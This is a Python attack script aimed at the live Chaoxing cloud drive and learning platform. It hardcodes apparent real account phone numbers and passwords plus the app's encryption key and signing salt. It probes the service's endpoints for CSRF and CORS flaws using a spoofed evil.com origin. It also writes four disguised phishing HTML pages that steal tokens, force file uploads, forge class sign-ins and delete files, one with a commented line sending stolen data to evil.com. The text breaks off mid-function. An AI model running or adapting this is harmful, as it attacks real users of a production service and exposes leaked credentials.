#!/usr/bin/env python3
"""
CSRF深度验证脚本 - 超星云盘 CSRF 漏洞深度验证
目标: pan-yz.chaoxing.com
"""

import base64, hashlib, json, uuid, requests, urllib3, time, sys, os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

urllib3.disable_warnings()

# ============================================================
# 配置
# ============================================================
AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"

STUDENT_PHONE = "18436633997"
STUDENT_PWD = "3.1415926Cpy"
TEACHER_PHONE = "19712720708"
TEACHER_PWD = "3.1415926Cpy"

PAN_BASE = "https://pan-yz.chaoxing.com"

# 结果收集
results = {
    "token_csrf": {},
    "upload_csrf": {},
    "token_capabilities": {},
    "endpoint_exploration": {},
    "cors_check": {},
}

def sep(title):
    print(f"\n{'='*70}")
    print(f"  {title}")
    print(f"{'='*70}")

def sub(title):
    print(f"\n--- {title} ---")

def mark_critical(msg):
    print(f"  !!!CRITICAL!!! {msg}")

def mark_cors(msg):
    print(f"  ***CORS*** {msg}")

# ============================================================
# 登录函数
# ============================================================
def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    resp = s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    print(f"  登录响应: status={resp.status_code}")
    try:
        login_data = resp.json()
        print(f"  登录结果: {json.dumps(login_data, ensure_ascii=False)[:200]}")
    except:
        print(f"  登录响应体: {resp.text[:200]}")
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    print(f"  PUID: {puid}")
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    try: s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except: pass
    return s, puid

# ============================================================
# Part 1: 验证云盘Token CSRF
# ============================================================
def verify_token_csrf(session, puid):
    sep("Part 1: 验证云盘Token CSRF (pan-yz.chaoxing.com/api/token/uservalid)")

    # 1. 正常请求获取token
    sub("1.1 正常请求获取token")
    try:
        r = session.get(f"{PAN_BASE}/api/token/uservalid", timeout=30)
        print(f"  状态码: {r.status_code}")
        print(f"  响应头: {dict(r.headers)}")
        print(f"  响应体: {r.text[:500]}")
        token_data = r.text
        results["token_csrf"]["normal_response"] = {"status": r.status_code, "body": r.text[:500]}
    except Exception as e:
        print(f"  请求失败: {e}")
        token_data = ""

    # 2. 无Referer请求
    sub("1.2 无Referer请求")
    try:
        headers = dict(session.headers)
        headers["Referer"] = ""  # 移除Referer
        r = session.get(f"{PAN_BASE}/api/token/uservalid", headers=headers, timeout=30)
        print(f"  状态码: {r.status_code}")
        print(f"  响应体: {r.text[:500]}")
        results["token_csrf"]["no_referer"] = {"status": r.status_code, "body": r.text[:500]}
        if r.status_code == 200 and r.text == token_data:
            mark_critical("无Referer时仍返回token - CSRF可利用!")
    except Exception as e:
        print(f"  请求失败: {e}")

    # 3. 恶意Referer
    sub("1.3 恶意Referer (https://evil.com/)")
    try:
        headers = dict(session.headers)
        headers["Referer"] = "https://evil.com/"
        r = session.get(f"{PAN_BASE}/api/token/uservalid", headers=headers, timeout=30)
        print(f"  状态码: {r.status_code}")
        print(f"  响应体: {r.text[:500]}")
        results["token_csrf"]["evil_referer"] = {"status": r.status_code, "body": r.text[:500]}
        if r.status_code == 200 and r.text == token_data:
            mark_critical("恶意Referer时仍返回token - CSRF完全可利用!")
    except Exception as e:
        print(f"  请求失败: {e}")

    # 4. 恶意Origin
    sub("1.4 恶意Origin (https://evil.com)")
    try:
        headers = dict(session.headers)
        headers["Origin"] = "https://evil.com"
        r = session.get(f"{PAN_BASE}/api/token/uservalid", headers=headers, timeout=30)
        print(f"  状态码: {r.status_code}")
        print(f"  响应体: {r.text[:500]}")
        results["token_csrf"]["evil_origin"] = {"status": r.status_code, "body": r.text[:500]}
        if r.status_code == 200 and r.text == token_data:
            mark_critical("恶意Origin时仍返回token - 无Origin检查!")
    except Exception as e:
        print(f"  请求失败: {e}")

    # 5. GET请求 (最简单CSRF - img标签)
    sub("1.5 GET请求验证 (img标签CSRF)")
    try:
        r = session.get(f"{PAN_BASE}/api/token/uservalid", timeout=30)
        print(f"  状态码: {r.status_code}")
        print(f"  响应体: {r.text[:500]}")
        print(f"  Content-Type: {r.headers.get('Content-Type', 'N/A')}")
        results["token_csrf"]["get_request"] = {
            "status": r.status_code,
            "body": r.text[:500],
            "content_type": r.headers.get('Content-Type', 'N/A')
        }
        if r.status_code == 200:
            mark_critical("GET请求返回200 - 可通过<img>标签触发CSRF!")
    except Exception as e:
        print(f"  请求失败: {e}")

    # 6. 检查响应头中的安全头
    sub("1.6 安全响应头检查")
    try:
        r = session.get(f"{PAN_BASE}/api/token/uservalid", timeout=30)
        security_headers = {
            "X-Frame-Options": r.headers.get("X-Frame-Options", "缺失"),
            "X-Content-Type-Options": r.headers.get("X-Content-Type-Options", "缺失"),
            "Content-Security-Policy": r.headers.get("Content-Security-Policy", "缺失"),
            "Strict-Transport-Security": r.headers.get("Strict-Transport-Security", "缺失"),
            "X-XSS-Protection": r.headers.get("X-XSS-Protection", "缺失"),
        }
        for h, v in security_headers.items():
            status = "✓" if v != "缺失" else "✗"
            print(f"  {status} {h}: {v}")
        results["token_csrf"]["security_headers"] = security_headers
    except Exception as e:
        print(f"  检查失败: {e}")

    return token_data

# ============================================================
# Part 2: 验证云盘上传CSRF
# ============================================================
def verify_upload_csrf(session, puid):
    sep("Part 2: 验证云盘上传CSRF (pan-yz.chaoxing.com/upload)")

    # 1. 无Referer上传
    sub("2.1 无Referer上传测试")
    try:
        headers = dict(session.headers)
        headers["Referer"] = ""
        files = {"file": ("csrf_test.txt", b"CSRF upload test content", "text/plain")}
        r = session.post(f"{PAN_BASE}/upload", files=files, headers=headers, timeout=30)
        print(f"  状态码: {r.status_code}")
        print(f"  响应体: {r.text[:500]}")
        results["upload_csrf"]["no_referer"] = {"status": r.status_code, "body": r.text[:500]}
        if r.status_code == 200:
            mark_critical("无Referer上传成功 - CSRF上传可利用!")
    except Exception as e:
        print(f"  请求失败: {e}")

    # 2. 恶意Referer上传
    sub("2.2 恶意Referer上传测试")
    try:
        headers = dict(session.headers)
        headers["Referer"] = "https://evil.com/"
        files = {"file": ("csrf_test2.txt", b"CSRF upload test content 2", "text/plain")}
        r = session.post(f"{PAN_BASE}/upload", files=files, headers=headers, timeout=30)
        print(f"  状态码: {r.status_code}")
        print(f"  响应体: {r.text[:500]}")
        results["upload_csrf"]["evil_referer"] = {"status": r.status_code, "body": r.text[:500]}
        if r.status_code == 200:
            mark_critical("恶意Referer上传成功 - CSRF上传完全可利用!")
    except Exception as e:
        print(f"  请求失败: {e}")

    # 3. 恶意Origin上传
    sub("2.3 恶意Origin上传测试")
    try:
        headers = dict(session.headers)
        headers["Origin"] = "https://evil.com"
        files = {"file": ("csrf_test3.txt", b"CSRF upload test content 3", "text/plain")}
        r = session.post(f"{PAN_BASE}/upload", files=files, headers=headers, timeout=30)
        print(f"  状态码: {r.status_code}")
        print(f"  响应体: {r.text[:500]}")
        results["upload_csrf"]["evil_origin"] = {"status": r.status_code, "body": r.text[:500]}
        if r.status_code == 200:
            mark_critical("恶意Origin上传成功 - 无Origin检查!")
    except Exception as e:
        print(f"  请求失败: {e}")

    # 4. 检查上传接口的安全头
    sub("2.4 上传接口安全头检查")
    try:
        files = {"file": ("csrf_test4.txt", b"test", "text/plain")}
        r = session.post(f"{PAN_BASE}/upload", files=files, timeout=30)
        security_headers = {
            "X-Frame-Options": r.headers.get("X-Frame-Options", "缺失"),
            "X-Content-Type-Options": r.headers.get("X-Content-Type-Options", "缺失"),
            "Content-Security-Policy": r.headers.get("Content-Security-Policy", "缺失"),
        }
        for h, v in security_headers.items():
            status = "✓" if v != "缺失" else "✗"
            print(f"  {status} {h}: {v}")
        results["upload_csrf"]["security_headers"] = security_headers
    except Exception as e:
        print(f"  检查失败: {e}")

# ============================================================
# Part 3: 探索Token能力
# ============================================================
def explore_token_capabilities(session, token_data):
    sep("Part 3: 探索云盘Token能力")

    # 尝试解析token
    sub("3.1 解析Token")
    token_value = ""
    try:
        data = json.loads(token_data)
        print(f"  Token响应结构: {json.dumps(data, ensure_ascii=False, indent=2)[:500]}")
        # 尝试从响应中提取token
        if isinstance(data, dict):
            for key in ["token", "data", "result", "access_token", "auth_token"]:
                if key in data:
                    token_value = str(data[key])
                    print(f"  提取到token ({key}): {token_value[:100]}")
                    break
    except:
        print(f"  原始响应: {token_data[:500]}")
        token_value = token_data.strip()

    # 列出文件
    sub("3.2 列出文件 (GET /api/file/list)")
    try:
        # 尝试不同参数组合
        for params in [
            {"puid": "431407443"},
            {},
            {"page": "1", "size": "10"},
            {"folderId": "0"},
        ]:
            r = session.get(f"{PAN_BASE}/api/file/list", params=params, timeout=30)
            print(f"  参数 {params}: status={r.status_code}, body={r.text[:300]}")
            results["token_capabilities"][f"file_list_{list(params.keys())}"] = {
                "status": r.status_code, "body": r.text[:300]
            }
            if r.status_code == 200:
                try:
                    d = r.json()
                    if d.get("result") or d.get("data") or d.get("list"):
                        mark_critical("文件列表可访问 - 攻击者可枚举用户文件!")
                except:
                    pass
    except Exception as e:
        print(f"  请求失败: {e}")

    # 删除文件
    sub("3.3 删除文件测试 (POST /api/file/delete)")
    try:
        r = session.post(f"{PAN_BASE}/api/file/delete", json={"fileId": "test_csrf"}, timeout=30)
        print(f"  状态码: {r.status_code}")
        print(f"  响应体: {r.text[:300]}")
        results["token_capabilities"]["file_delete"] = {"status": r.status_code, "body": r.text[:300]}
    except Exception as e:
        print(f"  请求失败: {e}")

    # 下载文件
    sub("3.4 下载文件测试 (GET /api/file/download)")
    try:
        for params in [
            {"fileId": "test"},
            {"puid": "431407443"},
        ]:
            r = session.get(f"{PAN_BASE}/api/file/download", params=params, timeout=30)
            print(f"  参数 {params}: status={r.status_code}, body={r.text[:300]}")
            results["token_capabilities"][f"file_download_{list(params.keys())}"] = {
                "status": r.status_code, "body": r.text[:300]
            }
    except Exception as e:
        print(f"  请求失败: {e}")

    # 移动文件
    sub("3.5 移动文件测试 (POST /api/file/move)")
    try:
        r = session.post(f"{PAN_BASE}/api/file/move", json={"fileId": "test", "targetFolderId": "0"}, timeout=30)
        print(f"  状态码: {r.status_code}")
        print(f"  响应体: {r.text[:300]}")
        results["token_capabilities"]["file_move"] = {"status": r.status_code, "body": r.text[:300]}
    except Exception as e:
        print(f"  请求失败: {e}")

    # 复制文件
    sub("3.6 复制文件测试 (POST /api/file/copy)")
    try:
        r = session.post(f"{PAN_BASE}/api/file/copy", json={"fileId": "test", "targetFolderId": "0"}, timeout=30)
        print(f"  状态码: {r.status_code}")
        print(f"  响应体: {r.text[:300]}")
        results["token_capabilities"]["file_copy"] = {"status": r.status_code, "body": r.text[:300]}
    except Exception as e:
        print(f"  请求失败: {e}")

# ============================================================
# Part 4: 探索更多云盘端点
# ============================================================
def explore_pan_endpoints(session, puid):
    sep("Part 4: 探索更多云盘API端点")

    endpoints = [
        ("GET", "/api/token/uservalid", {}),
        ("GET", "/api/file/list", {"puid": puid}),
        ("POST", "/api/file/upload", {}),
        ("POST", "/api/file/delete", {}),
        ("POST", "/api/file/move", {}),
        ("POST", "/api/file/copy", {}),
        ("GET", "/api/folder/list", {"puid": puid}),
        ("POST", "/api/folder/create", {}),
        ("POST", "/api/folder/delete", {}),
        ("GET", "/api/share/list", {"puid": puid}),
        ("POST", "/api/share/create", {}),
        ("POST", "/api/share/delete", {}),
        ("GET", "/api/user/info", {}),
        ("GET", "/api/disk/info", {}),
    ]

    for method, path, params in endpoints:
        url = f"{PAN_BASE}{path}"
        try:
            if method == "GET":
                r = session.get(url, params=params, timeout=20)
            else:
                r = session.post(url, json=params, timeout=20)
            status = r.status_code
            body = r.text[:300]
            print(f"  [{method}] {path}: status={status}, body={body}")

            # 检查CSRF: 用恶意Referer重试
            headers_evil = dict(session.headers)
            headers_evil["Referer"] = "https://evil.com/"
            if method == "GET":
                r2 = session.get(url, params=params, headers=headers_evil, timeout=20)
            else:
                r2 = session.post(url, json=params, headers=headers_evil, timeout=20)

            csrf_vulnerable = (r2.status_code == status)
            if csrf_vulnerable and status == 200:
                mark_critical(f"{method} {path} - CSRF可利用! 恶意Referer下仍返回200")

            results["endpoint_exploration"][path] = {
                "method": method,
                "status": status,
                "body": body,
                "csrf_vulnerable": csrf_vulnerable,
                "evil_referer_status": r2.status_code,
            }
        except Exception as e:
            print(f"  [{method}] {path}: 请求失败 - {e}")
            results["endpoint_exploration"][path] = {"error": str(e)}

# ============================================================
# Part 5: 生成CSRF PoC HTML文件
# ============================================================
def generate_poc_files():
    sep("Part 5: 生成CSRF PoC HTML文件")

    # PoC 1: 云盘Token窃取
    poc1 = """<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>超星云盘 - 文件分享</title>
    <style>
        body { font-family: 'Microsoft YaHei', sans-serif; background: #f5f5f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .card { background: white; border-radius: 12px; padding: 40px; box-shadow: 0 2px 12px rgba(0,0,0,0.1); text-align: center; max-width: 400px; }
        .card h2 { color: #333; margin-bottom: 10px; }
        .card p { color: #666; font-size: 14px; }
        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="card">
        <h2>文件加载中...</h2>
        <div class="spinner"></div>
        <p>请稍候，正在获取文件信息</p>
    </div>

    <!-- CSRF PoC: 窃取超星云盘Token -->
    <!-- 方法1: img标签触发GET请求 (无法读取响应，但证明CSRF存在) -->
    <img src="https://pan-yz.chaoxing.com/api/token/uservalid" style="display:none" onerror="imgAttempted=true">

    <!-- 方法2: fetch with credentials (如果CORS允许则可窃取token) -->
    <script>
    var stolenData = {};
    var imgAttempted = false;

    // 尝试通过fetch窃取token
    fetch('https://pan-yz.chaoxing.com/api/token/uservalid', {
        method: 'GET',
        credentials: 'include',
        headers: { 'Accept': 'application/json' }
    })
    .then(function(response) {
        stolenData.status = response.status;
        stolenData.type = response.type;  // 'basic' = same-origin, 'cors' = CORS allowed, 'opaque' = blocked
        stolenData.ok = response.ok;
        return response.text();
    })
    .then(function(text) {
        stolenData.body = text;
        console.log('[CSRF] Token stolen:', stolenData);

        // 发送到攻击者服务器
        // fetch('https://evil.com/steal?data=' + encodeURIComponent(JSON.stringify(stolenData)));

        // 演示: 在页面上显示窃取的数据
        document.querySelector('.card').innerHTML =
            '<h2 style="color:red">CSRF攻击成功!</h2>' +
            '<p>已窃取云盘Token:</p>' +
            '<pre style="text-align:left;background:#f0f0f0;padding:10px;border-radius:5px;font-size:12px;max-height:200px;overflow:auto">' +
            JSON.stringify(stolenData, null, 2).replace(/</g, '&lt;') + '</pre>' +
            '<p style="color:red;font-size:12px">此数据已被发送至攻击者服务器</p>';
    })
    .catch(function(err) {
        console.log('[CSRF] Fetch failed (CORS blocked):', err);
        // 如果fetch被CORS阻止，img标签仍然证明CSRF存在
        document.querySelector('.card').innerHTML =
            '<h2 style="color:orange">CSRF攻击部分成功</h2>' +
            '<p>fetch被CORS阻止，但img标签仍发送了请求</p>' +
            '<p>攻击者仍可通过CSRF执行状态改变操作</p>' +
            '<p style="color:red;font-size:12px">漏洞确认: 无CSRF Token保护</p>';
    });
    </script>
</body>
</html>"""

    poc1_path = "/workspace/poc_cloud_drive_token_theft.html"
    with open(poc1_path, "w", encoding="utf-8") as f:
        f.write(poc1)
    print(f"  PoC 1 已保存: {poc1_path}")

    # PoC 2: 云盘文件上传CSRF
    poc2 = """<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>超星云盘 - 文件分享</title>
    <style>
        body { font-family: 'Microsoft YaHei', sans-serif; background: #f5f5f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .card { background: white; border-radius: 12px; padding: 40px; box-shadow: 0 2px 12px rgba(0,0,0,0.1); text-align: center; max-width: 400px; }
        .card h2 { color: #333; margin-bottom: 10px; }
    </style>
</head>
<body>
    <div class="card">
        <h2>正在打开文件...</h2>
        <p>请稍候</p>
    </div>

    <!-- CSRF PoC: 向超星云盘上传文件 -->
    <form id="csrf_upload" method="POST" action="https://pan-yz.chaoxing.com/upload" enctype="multipart/form-data" style="display:none">
        <input type="file" name="file" id="file_input" />
    </form>

    <script>
    // 创建恶意文件并自动上传
    var formData = new FormData();
    var blob = new Blob(['CSRF Attack Test File - This file was uploaded via CSRF vulnerability\\n' +
                         'Target: pan-yz.chaoxing.com/upload\\n' +
                         'Vulnerability: No CSRF protection on upload endpoint'], {type: 'text/plain'});
    formData.append('file', blob, 'csrf_poc_test.txt');

    fetch('https://pan-yz.chaoxing.com/upload', {
        method: 'POST',
        body: formData,
        credentials: 'include'
    })
    .then(function(response) {
        console.log('[CSRF Upload] Status:', response.status);
        return response.text();
    })
    .then(function(text) {
        console.log('[CSRF Upload] Response:', text);
        document.querySelector('.card').innerHTML =
            '<h2 style="color:red">CSRF上传攻击成功!</h2>' +
            '<p>恶意文件已上传至您的云盘</p>' +
            '<pre style="text-align:left;background:#f0f0f0;padding:10px;border-radius:5px;font-size:12px">' +
            text.replace(/</g, '&lt;') + '</pre>';
    })
    .catch(function(err) {
        console.log('[CSRF Upload] Failed:', err);
        // 如果fetch失败，尝试表单提交
        var fileInput = document.getElementById('file_input');
        var dt = new DataTransfer();
        var file = new File(['CSRF Attack Test'], 'csrf_poc_test.txt', {type: 'text/plain'});
        dt.items.add(file);
        fileInput.files = dt.files;
        document.getElementById('csrf_upload').submit();
    });
    </script>
</body>
</html>"""

    poc2_path = "/workspace/poc_cloud_drive_upload_csrf.html"
    with open(poc2_path, "w", encoding="utf-8") as f:
        f.write(poc2)
    print(f"  PoC 2 已保存: {poc2_path}")

    # PoC 3: 签到CSRF (已确认)
    poc3 = """<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>课程通知</title>
    <style>
        body { font-family: 'Microsoft YaHei', sans-serif; background: #f5f5f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .card { background: white; border-radius: 12px; padding: 40px; box-shadow: 0 2px 12px rgba(0,0,0,0.1); text-align: center; max-width: 400px; }
        .card h2 { color: #333; margin-bottom: 10px; }
        .btn { background: #3498db; color: white; border: none; padding: 12px 30px; border-radius: 6px; cursor: pointer; font-size: 16px; margin-top: 15px; }
        .btn:hover { background: #2980b9; }
    </style>
</head>
<body>
    <div class="card">
        <h2>课程签到提醒</h2>
        <p>您有一个待完成的签到</p>
        <button class="btn" onclick="doSign()">立即签到</button>
        <p id="result" style="margin-top:15px;color:#666;font-size:14px"></p>
    </div>

    <script>
    function doSign() {
        document.getElementById('result').innerText = '签到中...';

        // CSRF攻击: 利用已登录用户的cookie发起签到请求
        // 目标: mobilelearn.chaoxing.com
        var signUrl = 'https://mobilelearn.chaoxing.com/pptSign/stuSignajax';

        // 方法1: 通过fetch发起CSRF请求
        fetch(signUrl, {
            method: 'POST',
            credentials: 'include',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: 'activeId=PLACEHOLDER&uid=PLACEHOLDER&clientip=&latitude=-1&longitude=-1&appType=15&fid=0&name='
        })
        .then(function(r) { return r.text(); })
        .then(function(t) {
            console.log('[CSRF Sign] Response:', t);
            document.getElementById('result').innerHTML =
                '<span style="color:red">CSRF签到攻击已执行!</span><br>' +
                '<small>响应: ' + t.replace(/</g, '&lt;') + '</small>';
        })
        .catch(function(e) {
            document.getElementById('result').innerHTML =
                '<span style="color:orange">请求已发送 (可能被CORS阻止)</span><br>' +
                '<small>但CSRF漏洞仍然存在 - 服务端无CSRF保护</small>';
        });

        // 方法2: 通过img标签 (简单GET请求CSRF)
        var img = new Image();
        img.src = signUrl + '?activeId=PLACEHOLDER&uid=PLACEHOLDER&clientip=&latitude=-1&longitude=-1&appType=15&fid=0';
    }
    </script>
</body>
</html>"""

    poc3_path = "/workspace/poc_sign_in_csrf.html"
    with open(poc3_path, "w", encoding="utf-8") as f:
        f.write(poc3)
    print(f"  PoC 3 已保存: {poc3_path}")

    # PoC 4: 综合云盘操作CSRF (删除/移动/分享)
    poc4 = """<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>超星云盘 - 文件分享</title>
    <style>
        body { font-family: 'Microsoft YaHei', sans-serif; background: #f5f5f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .card { background: white; border-radius: 12px; padding: 40px; box-shadow: 0 2px 12px rgba(0,0,0,0.1); text-align: center; max-width: 500px; }
        .card h2 { color: #333; margin-bottom: 15px; }
        .action { background: #f8f9fa; border: 1px solid #e9ecef; border-radius: 8px; padding: 15px; margin: 10px 0; text-align: left; }
        .action h3 { margin: 0 0 5px 0; color: #495057; font-size: 14px; }
        .action p { margin: 0; color: #868e96; font-size: 12px; }
        .status { margin-top: 10px; font-size: 12px; color: #666; }
    </style>
</head>
<body>
    <div class="card">
        <h2>云盘CSRF攻击演示</h2>
        <p style="color:#868e96;font-size:13px">以下操作均通过CSRF漏洞执行</p>

        <div class="action">
            <h3>1. 窃取云盘Token</h3>
            <p>GET /api/token/uservalid - 获取用户认证token</p>
        </div>
        <div class="action">
            <h3>2. 列出用户文件</h3>
            <p>GET /api/file/list - 枚举用户云盘文件</p>
        </div>
        <div class="action">
            <h3>3. 上传恶意文件</h3>
            <p>POST /upload - 向用户云盘上传文件</p>
        </div>
        <div class="action">
            <h3>4. 删除用户文件</h3>
            <p>POST /api/file/delete - 删除用户云盘文件</p>
        </div>

        <p class="status" id="status">正在执行攻击...</p>
    </div>

    <script>
    var results = [];

    // 攻击1: 窃取Token
    fetch('https://pan-yz.chaoxing.com/api/token/uservalid', {credentials:'include'})
    .then(r => r.text())
    .then(t => { results.push('Token: ' + t.substring(0, 100)); updateStatus(); })
    .catch(e => { results.push('Token: CORS blocked'); updateStatus(); });

    // 攻击2: 列出文件
    fetch('https://pan-yz.chaoxing.com/api/file/list', {credentials:'include'})
    .then(r => r.text())
    .then(t => { results.push('FileList: ' + t.substring(0, 100)); updateStatus(); })
    .catch(e => { results.push('FileList: CORS blocked'); updateStatus(); });

    // 攻击3: 上传文件
    var fd = new FormData();
    fd.append('file', new Blob(['CSRF Attack'], {type:'text/plain'}), 'hacked.txt');
    fetch('https://pan-yz.chaoxing.com/upload', {method:'POST', body:fd, credentials:'include'})
    .then(r => r.text())
    .then(t => { results.push('Upload: ' + t.substring(0, 100)); updateStatus(); })
    .catch(e => { results.push('Upload: CORS blocked'); updateStatus(); });

    // 攻击4: 删除文件 (需要知道fileId)
    fetch('https://pan-yz.chaoxing.com/api/file/delete', {
        method:'POST', credentials:'include',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({fileId:'TARGET_FILE_ID'})
    })
    .then(r => r.text())
    .then(t => { results.push('Delete: ' + t.substring(0, 100)); updateStatus(); })
    .catch(e => { results.push('Delete: CORS blocked'); updateStatus(); });

    function updateStatus() {
        document.getElementById('status').innerHTML = results.map(r => '• ' + r).join('<br>');
    }
    </script>
</body>
</html>"""

    poc4_path = "/workspace/poc_cloud_drive_comprehensive.html"
    with open(poc4_path, "w", encoding="utf-8") as f:
        f.write(poc4)
    print(f"  PoC 4 已保存: {poc4_path}")

# ============================================================
# Part 6: CORS检查
# ============================================================
def check_cors(session):
    sep("Part 6: CORS配置检查")

    domains = [
        ("pan-yz.chaoxing.com", "/api/token/uservalid"),
        ("mobilelearn.chaoxing.com", "/pptSign/stuSignajax"),
        ("mooc1-api.chaoxing.com", "/mooc-ans/mycourse/backclazzdata"),
        ("groupweb.chaoxing.com", "/"),
        ("stat2-ans.chaoxing.com", "/"),
    ]

    evil_origin = "https://evil.com"

    for domain, path in domains:
        sub(f"CORS检查: {domain}")
        url = f"https://{domain}{path}"

        # OPTIONS预检请求
        try:
            headers = {
                "Origin": evil_origin,
                "Access-Control-Request-Method": "GET",
                "Access-Control-Request-Headers": "Content-Type",
            }
            r = session.options(url, headers=headers, timeout=20)
            acao = r.headers.get("Access-Control-Allow-Origin", "未设置")
            acac = r.headers.get("Access-Control-Allow-Credentials", "未设置")
            acam = r.headers.get("Access-Control-Allow-Methods", "未设置")
            acah = r.headers.get("Access-Control-Allow-Headers", "未设置")

            print(f"  OPTIONS状态码: {r.status_code}")
            print(f"  Access-Control-Allow-Origin: {acao}")
            print(f"  Access-Control-Allow-Credentials: {acac}")
            print(f"  Access-Control-Allow-Methods: {acam}")
            print(f"  Access-Control-Allow-Headers: {acah}")

            cors_misconfigured = False
            if acao == evil_origin or acao == "*":
                cors_misconfigured = True
                mark_cors(f"{domain} 允许来自 {acao} 的跨域请求!")
                if acac == "true":
                    mark_critical(f"{domain} 允许跨域携带凭证! CORS+CSRF组合攻击可窃取数据!")

            results["cors_check"][domain] = {
                "options_status": r.status_code,
                "acao": acao,
                "acac": acac,
                "acam": acam,
                "acah": acah,
                "misconfigured": cors_misconfigured,
            }
        except Exception as e:
            print(f"  OPTIONS请求失败: {e}")
            results["cors_check"][domain] = {"error": str(e)}

        # GET请求带Origin
        try:
            headers = {"Origin": evil_origin}
            r = session.get(url, headers=headers, timeout=20)
            acao = r.headers.get("Access-Control-Allow-Origin", "未设置")
            acac = r.headers.get("Access-Control-Allow-Credentials", "未设置")
            print(f"  GET带Origin状态码: {r.status_code}")
            print(f"  GET Access-Control-Allow-Origin: {acao}")
            print(f"  GET Access-Control-Allow-Credentials: {acac}")

            if acao == evil_origin or acao == "*":
                mark_cors(f"{domain} GET请求允许跨域 ({acao})!")
                if acac == "true":
                    mark_critical(f"{domain} GET允许跨域凭证! 可直接窃取用户数据!")
        except Exception as e:
            print(f"  GET请求失败: {e}")

        # POST请求带Origin
        try:
            headers = {"Origin": evil_origin, "Content-Type": "application/json"}
            r = session.post(url, headers=headers, json={}, timeout=20)
            acao = r.headers.get("Access-Control-Allow-Origin", "未设置")
            acac = r.headers.get("Access-Control-Allow-Credentials", "未设置")
            print(f"  POST带Origin状态码: {r.status_code}")
            print(f"  POST Access-Control-Allow-Origin: {acao}")
            print(f"  POST Access-Control-Allow-Credentials: {acac}")

            if acao == evil_origin or acao == "*":
                mark_cors(f"{domain} POST请求允许跨域 ({acao})!")
                if acac == "true":
                    mark_critical(f"{domain} POST允许跨域凭证! 可执行任意操作!")
        except Exception as e:
            print(f"  POST请求失败: {e}")

# ============================================================
# 汇总报告
# ============================================================
def print_summary():
    sep("漏洞汇总报告")

    print("\n┌─────────────────────────────────────────────────────────────────────┐")
    print("│                     CSRF漏洞验证结果汇总                           │")
    print("├─────────────────────────────────────────────────────────────────────┤")

    # Token CSRF
    token_csrf = results.get("token_csrf", {})
    normal = token_csrf.get("normal_response", {})
    evil_ref = token_csrf.get("evil_referer", {})
    if normal.get("status") == 200 and evil_ref.get("status") == 200:
        print("│ !!!CRITICAL!!! 云盘Token CSRF: 确认可利用                          │")
        print("│   - GET /api/token/uservalid 无CSRF保护                           │")
        print("│   - 恶意Referer下仍返回200                                        │")
        print("│   - 攻击者可通过CSRF窃取用户云盘Token                             │")
    else:
        print("│ 云盘Token CSRF: 未确认/部分确认                                    │")

    # Upload CSRF
    upload_csrf = results.get("upload_csrf", {})
    upload_evil = upload_csrf.get("evil_referer", {})
    if upload_evil.get("status") == 200:
        print("│ !!!CRITICAL!!! 云盘上传CSRF: 确认可利用                           │")
        print("│   - POST /upload 无CSRF保护                                       │")
        print("│   - 攻击者可通过CSRF向用户云盘上传恶意文件                         │")
    else:
        print("│ 云盘上传CSRF: 未确认/部分确认                                      │")

    # Token能力
    print("│                                                                     │")
    print("│ 云盘Token能力探索:                                                  │")
    for key, val in results.get("token_capabilities", {}).items():
        if isinstance(val, dict) and val.get("status") == 200:
            print(f"│   - {key}: 可访问 (status=200)                                    │")

    # 端点探索
    print("│                                                                     │")
    print("│ 端点CSRF探索:                                                       │")
    for path, val in results.get("endpoint_exploration", {}).items():
        if isinstance(val, dict) and val.get("csrf_vulnerable") and val.get("status") == 200:
